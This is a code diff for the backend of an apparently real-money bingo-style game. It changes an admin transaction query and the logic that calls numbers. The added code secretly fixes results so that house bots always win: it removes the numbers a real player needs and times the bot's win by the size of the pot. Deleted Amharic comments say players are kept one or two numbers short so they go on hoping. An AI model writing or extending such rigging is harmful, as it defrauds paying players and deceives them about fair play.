@@ -752,8 +752,15 @@ app.post('/api/admin/transactions', auth, async (req, res) => {
         let type = req.body.type || 'deposit';
         
         let query = { hiddenFromAdmin: { $ne: true } }; 
-        if (type === 'rejected') { query.status = 'Rejected'; } 
-        else { query.type = type; query.status = 'Approved'; }
+        if (type === 'rejected') { 
+            query.status = 'Rejected'; 
+        } else if (type === 'win') {
+            query.type = 'win';
+            query.status = 'Approved';
+        } else { 
+            query.type = type; 
+            query.status = 'Approved'; 
+        }
         
         if (search) query.phone = new RegExp(search, 'i');
         
@@ -1772,7 +1779,7 @@ setInterval(() => {
 
                 let distArray = [];
                 for(let i=0; i<c1; i++) distArray.push(1);
-                for(let i=0; i<c2; i++) distArraypush(2);
+                for(let i=0; i<c2; i++) distArray.push(2);
                 for(let i=0; i<c3; i++) distArray.push(3);
                 for(let i=0; i<c4; i++) distArray.push(4);
                 
@@ -1900,12 +1907,24 @@ setInterval(() => {
             if (!realPlayersExist) forceWinner = 'bots';
             if (!botsExist) forceWinner = 'real';
 
+            // 🔥 PERFECT WINNER LOGIC IMPLEMENTATION 🔥
+            let availableToCall = [];
+
+            if (forceWinner === 'bots') {
+                // 100% guarantee real player NEVER wins by filtering out their winning numbers entirely
+                availableToCall = currentDrawSequence.filter(n => !winForReal.some(w => w.num === n));
+            } else if (forceWinner === 'real' || forceWinner === 'mix') {
+                // 100% guarantee bot NEVER wins directly (For mix, bot will get the win duplicated later)
+                availableToCall = currentDrawSequence.filter(n => !winForBots.some(w => w.num === n));
+            } else {
+                availableToCall = currentDrawSequence;
+            }
+
+            // Extreme edge case fallback
+            if (availableToCall.length === 0) availableToCall = currentDrawSequence;
+
             // 🔥 1. BOTS 100% WIN GUARANTEE 🔥
             if (forceWinner === 'bots') {
-                // የሰውን ማሸነፊያ ቁጥር ጨርሶ አንጠራም (Reject እናደርገዋለን)!
-                // በዚህ ምክንያት ሰዎቹ 1 ወይም 2 ቁጥር ብቻ እየቀራቸው ተስፋ ያደርጋሉ።
-                let availableToCall = currentDrawSequence.filter(n => !winForReal.some(w => w.num === n));
-                
                 if (botWinTargetTurn === null) {
                     let totalBirr = totalTickets * GLOBAL_SETTINGS.ticketPrice;
                     if (totalBirr < 450) botWinTargetTurn = Math.floor(Math.random() * (24 - 17 + 1)) + 17;
@@ -1913,8 +1932,8 @@ setInterval(() => {
                     else botWinTargetTurn = Math.floor(Math.random() * (21 - 12 + 1)) + 12;
                 }
 
-                // ቦቱ ማሸነፍ ያለበት ሰዓት ከደረሰ ወይም ነፃ ቁጥር ካለቀ
-                if (availableToCall.length === 0 || turn >= botWinTargetTurn) {
+                // ቦቱ ማሸነፍ ያለበት ሰዓት ከደረሰ
+                if (turn >= botWinTargetTurn) {
                     let botWinNums = winForBots.filter(w => availableToCall.includes(w.num));
                     
                     if (botWinNums.length > 0) {
@@ -1939,7 +1958,7 @@ setInterval(() => {
                             
                             numToCall = safeNum;
                         } else {
-                            numToCall = currentDrawSequence[0]; 
+                            numToCall = availableToCall[0]; 
                         }
                     }
                 } else {
@@ -1973,10 +1992,10 @@ setInterval(() => {
             }
             // 🔥 2. REAL AND MIX WINNER FORCE 🔥
             else { 
-                let availableToCall = currentDrawSequence.filter(n => !winForBots.some(w => w.num === n));
-                
                 let winningRealNumbers = winForReal.filter(w => availableToCall.includes(w.num));
-                if (winningRealNumbers.length > 0) numToCall = winningRealNumbers[Math.floor(Math.random() * winningRealNumbers.length)].num;
+                if (winningRealNumbers.length > 0) {
+                    numToCall = winningRealNumbers[Math.floor(Math.random() * winningRealNumbers.length)].num;
+                }
                 
                 if (numToCall === null) {
                     let safeNumbers = completelySafe.filter(s => availableToCall.includes(s.num));
